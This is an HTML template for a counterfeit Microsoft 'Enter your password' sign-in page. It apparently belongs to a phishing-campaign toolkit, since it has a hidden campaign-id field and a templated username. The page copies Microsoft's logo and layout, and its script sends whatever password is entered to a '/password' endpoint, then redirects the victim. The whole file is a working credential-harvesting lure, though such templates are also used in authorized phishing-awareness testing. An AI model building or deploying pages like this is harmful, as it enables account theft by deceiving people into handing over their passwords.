<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <input type="hidden" name="cid" value="{{ .Vars.campaign_id }}">
    <title>Login</title>

    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: Arial, Helvetica, sans-serif;
        }

        body {
            height: 100vh;
            background-image: url("/static/background.svg");
            /* background aqui */
            background-size: cover;
            background-position: center;
            display: flex;
            align-items: center;
            justify-content: center;
            position: relative;
        }

        /* overlay escuro */
        body::before {
            content: "";
            position: absolute;
            width: 100%;
            height: 100%;
            backdrop-filter: blur(3px);
            font-family: "Segoe UI Webfont", -apple-system, "Helvetica Neue",
                "Lucida Grande", "Roboto", "Ebrima", "Nirmala UI",
                "Gadugi", "Segoe Xbox Symbol", "Segoe UI Symbol",
                "Meiryo UI", "Khmer UI", "Tunga", "Lao UI",
                "Raavi", "Iskoola Pota", "Latha", "Leelawadee",
                "Microsoft YaHei UI", "Microsoft JhengHei UI",
                "Malgun Gothic", "Estrangelo Edessa",
                "Microsoft Himalaya", "Microsoft New Tai Lue",
                "Microsoft PhagsPa", "Microsoft Tai Le",
                "Microsoft Yi Baiti", "Mongolian Baiti",
                "MV Boli", "Myanmar Text", "Cambria Math",
                sans-serif;
        }

        .login-container {
            position: relative;
            width: 420px;
            background: #fff;
            border-radius: 8px;
            padding: 45px;
            box-shadow: 0 15px 40px rgba(0, 0, 0, 0.3);
        }

        .logo {
            margin-bottom: 20px;
        }

        .logo img {
            max-height: 36px;
        }


        .email {
            display: flex;
            align-items: center;
            gap: 4px;
            font-size: 14px;
            color: #333;
            font-size: 15px;
            font-weight: 400;
            font-style: bold !important;
            margin-bottom: 18px;
        }

        .back-icon {
            cursor: pointer;
        }

        h2 {
            font-size: 25px;
            margin-bottom: 10px;
        }

        .input-group {
            margin-bottom: 25px;
        }

        .input-group input {
            width: 100%;
            border: none;
            border-bottom: 2px solid #ddd;
            padding: 10px 5px;
            font-size: 15px;
            outline: none;
        }

        .input-group input:focus {
            border-bottom-color: #1b8ed1;
        }

        .actions {
            display: flex;
            justify-content: flex-end;
        }

        button {
            background: #1b8ed1;
            border: none;
            padding: 8px 24px;
            color: #fff;
            font-size: 14px;
            border-radius: 4px;
            cursor: pointer;
        }

        button:hover {
            background: #167bb5;
        }

        .error-message {
            color: #e53935;
            font-size: 14px;
            margin-bottom: 10px;
        }

        .input-group input {
            width: 100%;
            border: none;
            border-bottom: 2px solid #ccc;
            padding: 10px 5px;
            font-size: 15px;
            outline: none;
        }

        .input-group input.error {
            border-bottom: 2px solid #e53935;
        }

        .font-bold {
            font-weight: 500;
        }

        .login-container {
            position: relative;
            width: 420px;
            background: #fff;
            border-radius: 10px;
            padding: 40px;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.35);
        }

        .logo img {
            height: 26px;
            margin-bottom: 18px;
        }

        .email {
            display: flex;
            align-items: center;
            gap: 8px;
            margin-bottom: 20px;
        }

        .email-pill {
            background: #f3f3f3;
            padding: 5px 12px;
            border-radius: 16px;
            font-size: 14px;
            color: #333;
        }

        h2 {
            font-size: 24px;
            font-weight: 600;
            margin-bottom: 25px;
        }

        .input-group {
            margin-bottom: 25px;
        }

        .input-group input {
            width: 100%;
            border: none;
            border-bottom: 2px solid #c8c8c8;
            padding: 10px 5px;
            font-size: 15px;
        }

        .input-group input:focus {
            outline: none;
            border-bottom: 2px solid #0067b8;
        }

        .next-btn {
            width: 100%;
            background: #0067b8;
            border: none;
            color: white;
            padding: 10px;
            border-radius: 3px;
            font-size: 15px;
            cursor: pointer;
        }

        .next-btn:hover {
            background: #005a9e;
        }

        .other-signin {
            text-align: center;
            margin-top: 18px;
            color: #0067b8;
            font-size: 14px;
            cursor: pointer;
        }

        .other-signin:hover {
            text-decoration: underline;
        }

        .d-none {
            display: none;
        }
    </style>
</head>

<body>

    <div class="login-container">

        <div class="logo">
            <img src="/static/microsoft_logo.svg" alt="Logo">
        </div>

        <div class="email">
            <img src="/static/arrow_left.svg" alt="back" class="back-icon">
            <span class="email-pill">{{ .Vars.username }}</span>
        </div>

        <h2>Enter your password</h2>

        <div id="error-message" class="error-message d-none"></div>

        <form id="login-form" method="POST" action="/password" validate>

            <div class="input-group">
                <input id="password-input" type="password" name="password" placeholder="Password">
            </div>

            <button class="next-btn" type="submit">
                Next
            </button>

            <div class="other-signin">
                Other ways to sign in
            </div>

        </form>

    </div>
    <script>

        const form = document.getElementById('login-form');
        const errorDiv = document.getElementById('error-message');
        const input = document.getElementById('password-input');

        form.addEventListener('submit', async (e) => {

            e.preventDefault();

            input.classList.remove("error");
            errorDiv.classList.add("d-none");

            const formData = new URLSearchParams();

            for (const [key, value] of new FormData(form)) {
                formData.append(key, value);
            }

            const response = await fetch(form.action, {
                method: "POST",
                headers: {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                body: formData.toString()
            });

            const data = await response.json();

            if (data.redirect) {
                window.location.href = data.redirect;
                return;
            }

            if (!data.success) {

                errorDiv.textContent = data.error || "Login failed.";

                input.classList.add("error");
                errorDiv.classList.remove("d-none");
            }

        });

    </script>
</body>

</html>
